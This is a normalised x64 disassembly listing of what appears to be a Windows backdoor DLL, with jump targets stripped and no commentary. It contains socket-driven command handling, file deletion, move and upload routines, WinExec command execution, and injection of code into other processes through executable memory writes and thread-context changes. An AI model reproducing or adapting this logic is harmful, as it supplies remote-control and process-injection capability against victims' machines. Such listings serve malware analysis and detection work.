call [ FindClose@IAT ]
mov eax ebp
mov rax [ rsp + 0x254 ]
mov ecx [ rsp + 0x250 ]
mov [ rsp + 0x24 ] rax
mov rax [ rsp + 0x25c ]
mov [ rsp + 0x20 ] ecx
mov [ rsp + 0x2c ] rax
mov rax [ rsp + 0x264 ]
mov [ rsp + 0x34 ] rax
test cl 0x10
je r-xdata
mov ecx [ rsp + 0x26c ]
mov eax [ rsp + 0x270 ]
shl rcx 0x20
add rcx rax
mov [ rsp + 0x40 ] rcx
or [ rsp + 0x40 ] 0xffffffffffffffff
jmp r-xdata
inc ebp
lea r8 [ rsp + 0x27c ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_18000d138
mov rcx [ rsi ]
lea rdx [ rsp + 0x20 ]
movsxd rdi eax
lea r8d [ rdi + 0x12d ]
call sub_18000a1ac
movsxd rcx eax
lea rax [ rdi + 0x12d ]
cmp rcx rax
jne r-xdata
sub_180002558
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x230
mov rbx r9
mov rdi rdx
lea r9 [ rdx + 0x28 ]
mov r8d [ rbx ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
add r8 0x10
xor esi esi
call sub_18000d138
test [ rdi ] 0x1
je r-xdata
test [ rdi ] 0x10
lea rcx [ rsp + 0x20 ]
je r-xdata
lea rcx [ rsp + 0x20 ]
mov edx 0x80
call [ SetFileAttributesW@IAT ]
mov esi eax
call [ DeleteFileW@IAT ]
call [ RemoveDirectoryW@IAT ]
jmp r-xdata
test esi esi
je r-xdata
inc [ rbx + 0x4 ]
jmp r-xdata
test eax eax
je r-xdata
lea r11 [ rsp + 0x230 ]
mov eax 0x1
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov edx [ rdi ]
lea rcx [ rsp + 0x20 ]
call [ SetFileAttributesW@IAT ]
sub_1800025f4
mov r11 rsp
push rbx
sub rsp 0x840
mov rbx rcx
lea rcx [ r11 - 0x608 ]
mov rax rdx
mov [ rsp + 0x20 ] rcx
lea r9 [ r11 - 0x408 ]
lea r8 [ r11 - 0x208 ]
lea rdx [ r11 + 0x8 ]
mov rcx rax
call sub_18000dab4
lea r9 [ rsp + 0x640 ]
lea r8 [ rsp + 0x850 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d138
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_180002ac0
lea r9 [ rsp + 0x240 ]
lea r8 [ rsp + 0x440 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d138
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x864 ] 0x0
lea rax [ rsp + 0x860 ]
lea r9 [ sub_180002558 ]
lea rdx [ rsp + 0x30 ]
xor r8d r8d
mov rcx rbx
mov [ rsp + 0x860 ] ebx
mov [ rsp + 0x20 ] rax
call sub_180002860
mov rcx rbx
sub eax [ rsp + 0x864 ]
neg eax
sbb edx edx
and edx 0x5
call sub_180001f88
xor eax eax
add rsp 0x840
pop rbx
retn
sub_1800026d4
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x10 ] rbp
push rdi
sub rsp 0x480
mov rax rdx
mov rdi rcx
lea rdx [ r11 + 0x18 ]
mov rcx rax
call [ CommandLineToArgvW@IAT ]
cmp [ rsp + 0x4a0 ] 0x2
mov rbx rax
je r-xdata
lea rcx [ rsp + 0x62 ]
xor ebp ebp
xor edx edx
mov r8d 0x206
mov [ rsp + 0x60 ] bp
call sub_180016870
lea rcx [ rsp + 0x272 ]
xor edx edx
mov r8d 0x206
mov [ rsp + 0x270 ] bp
call sub_180016870
mov r8 [ rbx ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
call sub_18000d138
mov r8 [ rbx + 0x8 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x270 ]
call sub_18000d138
lea r8d [ rbp + 0x38 ]
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180016870
lea rax [ rsp + 0x60 ]
mov r11d 0x61c
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x270 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x40 ] r11w
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x20 ] rbp
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x50 ] rbp
mov [ rsp + 0x28 ] 0x1
call [ SHFileOperationW@IAT ]
mov rcx rdi
mov edx eax
mov ebx eax
call sub_180001f88
mov eax ebx
mov edx 0x57
mov rcx rdi
call sub_180001f88
xor eax eax
jmp r-xdata
lea r11 [ rsp + 0x480 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
sub_1800027f8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rax rdx
mov rbx rcx
lea rdx [ rsp + 0x40 ]
mov rcx rax
call [ CommandLineToArgvW@IAT ]
cmp [ rsp + 0x40 ] 0x2
je r-xdata
mov rdx [ rax + 0x8 ]
mov rcx [ rax ]
call [ MoveFileW@IAT ]
mov edi eax
xor eax eax
cmp edi eax
jne r-xdata
mov edx 0x57
mov rcx rbx
call sub_180001f88
xor eax eax
jmp r-xdata
mov edx eax
mov rcx rbx
call sub_180001f88
mov eax edi
call [ GetLastError@IAT ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180002860
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8b
push rbp
push rsi
push rdi
sub rsp 0x6d0
mov bl r8b
mov rbp rdx
mov rsi rcx
call sub_180003008
test eax eax
je r-xdata
xor edi edi
test bl bl
lea rbx [ rsi + 0x218 ]
lea r8 [ rsi + 0x10 ]
mov r9 rbp
lea rdx [ r--data ]
mov rcx rbx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
call sub_18000d138
lea rdx [ rsp + 0x4c0 ]
mov r9b 0x1
mov r8d 0x104
mov rcx rbx
call sub_18000c884
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x4c0 ]
call [ FindFirstFileW@IAT ]
mov [ rsp + 0x38 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
lea rdx [ r--data ]
mov rbx [ rsp + 0x6f0 ]
add rsp 0x6d0
pop rdi
pop rsi
pop rbp
retn
mov ebx [ rsp + 0x718 ]
xor eax eax
jmp r-xdata
mov rcx [ rsp + 0x38 ]
lea rdx [ rsp + 0x40 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x6c ]
call sub_18000d5e8
test eax eax
je r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x6c ]
call sub_18000d5e8
test eax eax
je r-xdata
mov rcx [ rsp + 0x38 ]
call [ FindClose@IAT ]
mov eax edi
mov eax [ rsp + 0x40 ]
mov ecx [ rsp + 0x5c ]
mov r8 rbp
mov [ rsp + 0x290 ] eax
mov rax [ rsp + 0x44 ]
shl rcx 0x20
mov [ rsp + 0x294 ] rax
mov rax [ rsp + 0x4c ]
mov [ rsp + 0x29c ] rax
mov rax [ rsp + 0x54 ]
mov [ rsp + 0x2a4 ] rax
mov eax [ rsp + 0x60 ]
add rcx rax
cmp [ rsp + 0x700 ] 0x0
mov [ rsp + 0x2b0 ] rcx
lea rcx [ rsp + 0x2b8 ]
je r-xdata
lea rdx [ r--data ]
call sub_18000d138
lea r9 [ rsp + 0x6c ]
lea rdx [ r--data ]
call sub_18000d138
jmp r-xdata
inc edi
test [ rsp + 0x290 ] 0x10
je r-xdata
mov r9 [ rsp + 0x710 ]
lea r8d [ rax + 0x12d ]
lea rdx [ rsp + 0x290 ]
xor ecx ecx
call [ rsp + 0x708 ]
test eax eax
je r-xdata
mov [ rsp + 0x30 ] eax
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
cmp [ rsp + 0x700 ] 0x0
mov r8 rbp
lea rcx [ rsp + 0x4c0 ]
je r-xdata
mov r8d [ rsp + 0x30 ]
mov r9 [ rsp + 0x710 ]
lea rdx [ rsp + 0x290 ]
add r8d 0x12d
xor ecx ecx
call [ rsp + 0x708 ]
test eax eax
je r-xdata
lea rdx [ r--data ]
call sub_18000d138
lea r9 [ rsp + 0x6c ]
lea rdx [ r--data ]
call sub_18000d138
jmp r-xdata
add edi eax
mov rax [ rsp + 0x710 ]
mov r9 [ rsp + 0x708 ]
lea rdx [ rsp + 0x4c0 ]
mov r8b 0x1
mov rcx rsi
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rax
call sub_180002860
cmp eax 0xffffffff
je r-xdata
sub_180002ac0
push rbx
sub rsp 0x20
mov rax rdx
lea rdx [ rcx + 0x10 ]
mov rbx rcx
mov r9b 0x1
mov r8d 0x104
mov rcx rax
call sub_18000c884
movsxd rcx eax
cmp [ rbx + rcx * 2 + 0xe ] 0x5c
jne r-xdata
add rsp 0x20
pop rbx
retn
xor eax eax
mov [ rbx + rcx * 2 + 0xe ] ax
sub_180002afc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov rcx rdx
mov rbx rdx
call [ GetFileAttributesW@IAT ]
mov esi 0x80
mov rcx rbx
mov edx esi
mov edi eax
call [ SetFileAttributesW@IAT ]
and [ rsp + 0x30 ] 0x0
lea r8d [ rsi - 0x7e ]
xor r9d r9d
mov edx 0x40000000
mov rcx rbx
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] 0x4
call [ CreateFileW@IAT ]
mov edx edi
mov rcx rbx
mov rsi rax
cmp rax 0xffffffffffffffff
jne r-xdata
call [ SetFileAttributesW@IAT ]
mov rcx rsi
call [ CloseHandle@IAT ]
mov eax 0x1
call [ SetFileAttributesW@IAT ]
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
sub_180002b8c
mov r11 rsp
mov [ r11 + 0x10 ] rbx
push rdi
sub rsp 0xa50
mov rdi rcx
lea rcx [ r11 - 0x618 ]
mov rax rdx
mov [ rsp + 0x20 ] rcx
lea r9 [ r11 - 0x818 ]
lea r8 [ r11 - 0x418 ]
lea rdx [ r11 + 0x8 ]
mov rcx rax
call sub_18000dab4
lea r9 [ rsp + 0x640 ]
lea r8 [ rsp + 0xa60 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d138
lea r8 [ rdi + 0x10 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x840 ]
call sub_18000d138
lea rdx [ rsp + 0x30 ]
mov rcx rdi
call sub_180002ac0
lea r9 [ rsp + 0x440 ]
lea r8 [ rsp + 0x240 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d138
mov rax [ rdi ]
lea r9 [ sub_180002538 ]
lea rdx [ rsp + 0x30 ]
xor r8d r8d
mov rcx rdi
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] rax
call sub_180002860
lea rdx [ rsp + 0x840 ]
mov rcx rdi
mov ebx eax
call sub_180002ac0
lea rcx [ rsp + 0x30 ]
xor edx edx
mov r8d 0x208
call sub_180016870
mov rcx [ rdi ]
lea rdx [ rsp + 0x30 ]
mov r8d 0x12c
call sub_18000a1ac
mov eax ebx
mov rbx [ rsp + 0xa68 ]
add rsp 0xa50
pop rdi
retn
sub_180002ca0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x250
mov rdi rdx
mov rbx rcx
lea rdx [ rsp + 0x20 ]
mov rcx rdi
call sub_180001e20
mov rcx rbx
test al al
jne r-xdata
xor edx edx
call sub_180001f88
mov rdx rdi
mov rcx rbx
call sub_180002b8c
mov edx 0x2
call sub_180001f88
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x260 ]
add rsp 0x250
pop rdi
retn
sub_180002cf8
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx rdx
call sub_18000d41c
xor edx edx
mov rcx rbx
mov [ rbx + 0x8 ] rax
call sub_180001f88
mov eax [ rbx + 0x8 ]
add rsp 0x20
pop rbx
retn
sub_180002d20
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x460
mov rdi rcx
mov rbx rdx
lea rcx [ rsp + 0x20 ]
xor edx edx
mov r8d 0x230
call sub_180016870
lea r8 [ rdi + 0x10 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x250 ]
mov r9 rbx
call sub_18000d138
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x250 ]
call sub_180001e20
mov rcx [ rdi ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x8
call sub_18000a1ac
mov rbx [ rsp + 0x470 ]
mov eax 0x1
add rsp 0x460
pop rdi
retn
sub_180002d9c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x420
mov rdi rcx
mov rbx rdx
lea rcx [ rsp + 0x21 ]
xor edx edx
mov r8d 0x3ff
mov [ rsp + 0x20 ] 0x0
call sub_180016870
lea rcx [ rsp + 0x20 ]
xor r9d r9d
mov r8 rbx
mov edx 0x400
call sub_18000c71c
xor edx edx
mov rcx rax
call [ WinExec@IAT ]
cmp eax 0x20
jbe r-xdata
call [ GetLastError@IAT ]
mov edx eax
xor edx edx
jmp r-xdata
mov rcx rdi
call sub_180001f88
mov rbx [ rsp + 0x430 ]
mov eax 0x1
add rsp 0x420
pop rdi
retn
sub_180002e18
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x230
mov rbx rcx
lea r8 [ rcx + 0x10 ]
mov r9 rdx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call sub_18000d138
lea rcx [ rsp + 0x20 ]
xor edx edx
call [ CreateDirectoryW@IAT ]
mov edi eax
xor eax eax
cmp edi eax
jne r-xdata
mov edx eax
mov rcx rbx
call sub_180001f88
mov rbx [ rsp + 0x240 ]
mov eax edi
add rsp 0x230
pop rdi
retn
call [ GetLastError@IAT ]
sub_180002e78
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x480
mov rdi [ rcx + 0x8 ]
and [ rcx + 0x8 ] 0x0
mov rbx rcx
lea r8 [ rcx + 0x10 ]
mov r9 rdx
lea rcx [ rsp + 0x40 ]
lea rdx [ r--data ]
call sub_18000d138
lea rdx [ rsp + 0x250 ]
lea rcx [ rsp + 0x40 ]
call sub_180001e20
test al al
jne r-xdata
and [ rsp + 0x30 ] 0x0
xor r9d r9d
lea rcx [ rsp + 0x40 ]
lea r8d [ r9 + 0x1 ]
mov edx 0x80000000
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
call [ CreateFileW@IAT ]
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx 0x2
jmp r-xdata
mov rcx rax
call [ CloseHandle@IAT ]
xor edx edx
mov rcx rbx
call sub_180001f88
test [ rsp + 0x250 ] 0x10
je r-xdata
call [ GetLastError@IAT ]
mov edx eax
jmp r-xdata
mov rcx rbx
call sub_180001f88
mov rcx [ rbx ]
lea rdx [ rsp + 0x40 ]
mov r8 rdi
call sub_18000b318
cmp eax 0xffffffff
je r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
xor edx edx
mov rbx [ rsp + 0x490 ]
add rsp 0x480
pop rdi
retn
sub_180002f5c
push rbx
sub rsp 0x460
mov rbx rcx
lea r8 [ rcx + 0x10 ]
mov r9 rdx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call sub_18000d138
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_180002afc
test eax eax
jne r-xdata
xor edx edx
mov rcx rbx
call sub_180001f88
mov rcx [ rbx ]
lea rdx [ rsp + 0x230 ]
or r9d 0xffffffff
mov r8d 0x12c
call sub_18000a128
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov rcx rbx
mov edx eax
call sub_180001f88
xor eax eax
jmp r-xdata
mov r8 [ rsp + 0x250 ]
mov rcx [ rbx ]
lea rdx [ rsp + 0x20 ]
call sub_18000b48c
test eax eax
je r-xdata
add rsp 0x460
pop rbx
retn
lea rdx [ rsp + 0x230 ]
lea rcx [ rsp + 0x20 ]
call sub_180001eac
mov eax 0x1
sub_180003008
mov [ rsp + 0x8 ] rbx
push rsi
sub rsp 0x280
xor esi esi
mov rbx rcx
lea rcx [ rsp + 0x32 ]
lea r8d [ rsi + 0x3e ]
xor edx edx
mov [ rsp + 0x30 ] si
call sub_180016870
mov rax [ rbx ]
lea rdx [ rsp + 0x70 ]
mov [ rsp + 0x78 ] rax
lea rax [ rsp + 0x298 ]
xor r9d r9d
xor r8d r8d
xor ecx ecx
mov [ rsp + 0x298 ] esi
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x29c ] esi
mov [ rsp + 0x70 ] 0x1
call [ select@IAT ]
cmp eax esi
je r-xdata
xor eax eax
mov rcx [ rbx ]
lea r9d [ rsi + 0x2 ]
lea r8d [ rsi + 0xc ]
lea rdx [ rsp + 0x30 ]
call [ recv@IAT ]
cmp eax esi
jg r-xdata
mov [ rsp + 0x3c ] si
cmp eax 0xc
jne r-xdata
mov eax 0x1
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_180001fa8
cmp eax esi
je r-xdata
mov rbx [ rsp + 0x290 ]
add rsp 0x280
pop rsi
retn
mov rcx [ rbx ]
xor r9d r9d
lea rdx [ rsp + 0x30 ]
lea r8d [ r9 + 0xc ]
call [ recv@IAT ]
jmp r-xdata
sub_1800030e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
mov eax 0x29e0
call sub_1800232c0
sub rsp rax
mov rdi rcx
mov rbx rdx
lea rcx [ rsp + 0x132 ]
xor esi esi
xor edx edx
mov r8d 0x7fe
mov [ rsp + 0x130 ] si
call sub_180016870
lea rcx [ rsp + 0x21 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x20 ] sil
call sub_180016870
lea rcx [ rsp + 0x930 ]
call sub_180001204
lea rcx [ r--data ]
mov rdx rbx
mov [ rsp + 0x930 ] rcx
lea rcx [ rsp + 0x930 ]
call sub_180001cb4
cmp al sil
jne r-xdata
lea rcx [ rsp + 0x930 ]
call sub_180001db8
cmp al sil
jne r-xdata
lea edx [ rsi + 0x2 ]
mov rcx rdi
call sub_180001f88
mov rcx rdi
call sub_180003008
cmp eax esi
jne r-xdata
xor edx edx
mov rcx rdi
call sub_180001f88
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x930 ]
call sub_180001d10
lea r8 [ rsp + 0x20 ]
lea rcx [ rsp + 0x130 ]
xor r9d r9d
mov edx 0x400
call sub_18000c7d4
mov rcx [ rdi ]
lea rdx [ rsp + 0x130 ]
mov r8d 0x800
call sub_18000a1ac
lea rcx [ rsp + 0x930 ]
call sub_180001dac
mov eax 0x1
lea r11 [ rsp + 0x29e0 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov edx 0x4c7
mov rcx rdi
call sub_180001f88
lea rcx [ rsp + 0x930 ]
call sub_180001dac
jmp r-xdata
xor eax eax
jmp r-xdata
sub_18000322c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov esi [ r9 + 0x4 ]
mov rdi rdx
mov edx [ r9 + 0x8 ]
mov eax 0x2f
lea rcx [ rdi + 0x2a ]
mov ebx r8d
mov [ rdi + 0x28 ] ax
call [ PathMatchSpecW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
mov r8d ebx
mov rdx rdi
mov rcx rsi
call sub_18000a1ac
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000328c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x250
mov eax [ rcx ]
mov [ rsp + 0x38 ] edx
lea r9 [ sub_18000322c ]
mov [ rsp + 0x34 ] eax
lea rax [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8b 0x1
mov [ rsp + 0x28 ] 0x1
mov rdi rcx
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x30 ] ecx
call sub_180002860
lea rcx [ rsp + 0x40 ]
xor edx edx
mov r8d 0x208
mov ebx eax
call sub_180016870
mov rcx [ rdi ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x12c
call sub_18000a1ac
mov eax ebx
mov rbx [ rsp + 0x260 ]
add rsp 0x250
pop rdi
retn
sub_18000330c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x270
mov r8 rcx
mov rdi rcx
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000c710
mov ecx 0x420
call sub_18000dc18
test rax rax
je r-xdata
xor ebx ebx
mov rcx rax
call sub_180001f58
mov rbx rax
jmp r-xdata
lea rdx [ rsp + 0x20 ]
or r9d 0xffffffff
mov r8d 0x248
mov rcx rdi
call sub_1800076d8
test eax eax
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001f84
jmp r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_180001fc8
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x280 ]
add rsp 0x270
pop rdi
retn
mov rcx rbx
call sub_180001f78
mov rcx rbx
call j_sub_18000e06c
sub_1800033b0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x70
mov rdi rcx
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov rbx rax
call [ GetCurrentProcess@IAT ]
mov rcx rax
and [ rsp + 0x20 ] 0x0
mov r9d 0x30
lea r8 [ rsp + 0x40 ]
xor edx edx
call rbx
test eax eax
js r-xdata
jmp r-xdata
mov rax [ rsp + 0x48 ]
mov r9 [ rax + 0x18 ]
add r9 0x10
mov r8 [ r9 ]
mov [ rsp + 0x38 ] r8
mov rbx [ rsp + 0x80 ]
add rsp 0x70
pop rdi
retn
mov rdx [ r8 + 0xb8 ]
mov [ rsp + 0x30 ] rdx
mov r10 [ r8 + 0xc0 ]
mov r8 [ r8 ]
mov [ rsp + 0x38 ] r8
jmp r-xdata
mov rax [ rdx + 0x10 ]
cmp [ rax + 0x30 ] rdi
jne r-xdata
cmp r8 r9
je r-xdata
mov rdx [ rdx ]
mov [ rsp + 0x30 ] rdx
jmp r-xdata
mov rcx [ rdx ]
mov rax [ rdx + 0x8 ]
mov [ rax ] rcx
mov [ rcx + 0x8 ] rax
cmp rdx r10
je r-xdata
sub_180003470
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x160
mov rbx rcx
lea rcx [ rsp + 0x61 ]
xor ebp ebp
xor edx edx
mov r8d 0xff
mov [ rsp + 0x60 ] bpl
call sub_180016870
mov rcx [ rbx ]
lea rdx [ rsp + 0x60 ]
mov r8d 0x100
call [ GetModuleFileNameA@IAT ]
mov rcx [ rbx + 0x8 ]
mov rdi [ rbx ]
mov rax [ rcx ]
call [ rax + 0x18 ]
lea rdx [ rw-data ]
add rbx 0x10
mov rsi rax
sub rdx rbx
movzx ecx [ rbx ]
mov [ rdx + rbx ] cx
add rbx 0x2
cmp cx bp
jne r-xdata
mov rcx rdi
call sub_180006784
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rbx rax
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x30
xor edx edx
mov rcx rax
mov [ rsp + 0x20 ] rbp
call rbx
mov ebx 0x1
cmp eax ebp
jl r-xdata
mov rcx rdi
call sub_1800033b0
mov rcx rdi
call [ FreeLibrary@IAT ]
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
lea r8 [ sub_18000708c ]
xor r9d r9d
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] rbp
mov [ rw-data ] rsi
mov [ rsp + 0x20 ] ebp
call [ CreateThread@IAT ]
cmp rax rbp
je r-xdata
mov rax [ rsp + 0x38 ]
mov rcx [ rax + 0x18 ]
add rcx 0x10
mov rax [ rcx ]
jmp r-xdata
mov ecx ebx
call [ Sleep@IAT ]
mov rcx rdi
call sub_1800033b0
jmp r-xdata
mov rcx rax
call [ CloseHandle@IAT ]
cmp rax rcx
jne r-xdata
cmp [ rax + 0x30 ] rdi
je r-xdata
jmp r-xdata
mov [ rax + 0x6c ] bx
mov rax [ rax ]
sub_1800035c8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
mov rsi rcx
xor ecx ecx
mov edx 0x218
lea r9d [ rcx + 0x4 ]
mov r8d 0x1000
call [ VirtualAlloc@IAT ]
mov rcx rsi
mov rdi rax
call [ GetModuleHandleW@IAT ]
mov ecx 0x28
mov rbp rax
call sub_18000dc18
xor r12d r12d
cmp rax r12
je r-xdata
mov rbx r12
mov rcx rax
call sub_180007d90
mov rbx rax
jmp r-xdata
movzx eax [ rcx ]
mov [ rdx + rcx ] ax
add rcx 0x2
cmp ax r12w
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
lea r8 [ sub_180003470 ]
mov r9 rdi
sub r8 rbp
xor edx edx
xor ecx ecx
add r8 rax
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] r12d
call [ CreateThread@IAT ]
mov rcx rax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
jmp [ CloseHandle@IAT ]
mov rax [ rbx ]
mov rdx rsi
mov rcx rbx
call [ rax ]
lea rcx [ rsi + 0x208 ]
lea rdx [ rdi + 0x10 ]
sub rdx rcx
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbx
sub_1800036f0
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
sub rsp 0x530
mov r8d [ rdx + 0x10 ]
mov rsi rdx
mov rdi rcx
xor edx edx
mov ecx 0x1fffff
xor ebx ebx
call [ rdi + 0x118 ]
mov rbp rax
cmp rax rbx
je r-xdata
mov eax ebx
mov rbx [ rsp + 0x560 ]
add rsp 0x530
pop rdi
pop rsi
pop rbp
retn
mov r8d [ rsi + 0x14 ]
xor edx edx
mov ecx 0x1fffff
call [ rdi + 0x120 ]
mov rsi rax
cmp rax rbx
je r-xdata
mov rcx rbp
call [ rdi + 0x80 ]
lea rdx [ rsp + 0x60 ]
mov rcx rax
mov [ rsp + 0x90 ] 0x10000b
call [ rdi + 0x128 ]
cmp eax ebx
je r-xdata
mov rcx rsi
call [ rdi + 0x80 ]
mov rdx [ rsp + 0xe0 ]
lea r9d [ rbx + 0x30 ]
lea r8 [ rsp + 0x30 ]
mov rcx rbp
call [ rdi + 0xd0 ]
mov rdx [ rsp + 0x38 ]
lea r9d [ rbx + 0x4 ]
lea r8 [ rsp + 0x558 ]
add rdx 0x3c
mov rcx rbp
mov [ rsp + 0x20 ] rbx
call [ rdi + 0x108 ]
cmp eax ebx
je r-xdata
mov ecx [ rsp + 0x558 ]
mov rax [ rsp + 0x38 ]
lea r9d [ rbx + 0x2 ]
lea rdx [ rcx + rax + 0x18 ]
lea r8 [ rsp + 0x550 ]
mov rcx rbp
mov [ rsp + 0x550 ] bx
mov [ rsp + 0x20 ] rbx
call [ rdi + 0x108 ]
cmp eax ebx
je r-xdata
mov eax 0x10b
lea ecx [ rbx + 0x1 ]
cmp [ rsp + 0x550 ] ax
cmove ebx ecx
sub_180003814
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r13
sub rsp 0xa30
mov rbx rdx
mov rsi rcx
call sub_1800036f0
mov r8d [ rbx + 0x10 ]
xor edx edx
mov ecx 0x1fffff
mov edi eax
call [ rsi + 0x118 ]
mov rbp rax
test rax rax
je r-xdata
lea r11 [ rsp + 0xa30 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop r13
retn
test edi edi
je r-xdata
lea rax [ sub_18000611c ]
lea r13 [ sub_1800036b0 ]
mov r9d 0x1000
sub eax r13d
xor edx edx
mov rcx rbp
mov r8d eax
mov ebx eax
mov [ rsp + 0x20 ] 0x40
call [ rsi + 0xe0 ]
mov r8 [ rsi + 0x40 ]
and [ rsp + 0x20 ] 0x0
mov rdx rax
mov r9 rbx
mov rcx rbp
mov rdi rax
call [ rsi + 0x110 ]
xor edx edx
mov r9d 0x1000
mov r8d 0x1c0
mov rcx rbp
mov [ rsp + 0x20 ] 0x4
call [ rsi + 0xe0 ]
and [ rsp + 0x30 ] 0x0
sub rdi r13
lea r9 [ sub_180005bd4 ]
add r9 rdi
and [ rsp + 0x28 ] 0x0
mov ecx 0x51ec8b55
mov eax 0x401046
mov edx 0x1475ff18
mov [ rsp + 0x94 ] ecx
mov [ rsp + 0xac ] eax
mov [ rsp + 0xfc ] eax
mov [ rsp + 0x11c ] ecx
mov eax 0x75ff0c75
mov ecx 0xff1075ff
mov [ rsp + 0x40 ] 0x4d4c4742
mov [ rsp + 0x44 ] 0x4244c8b
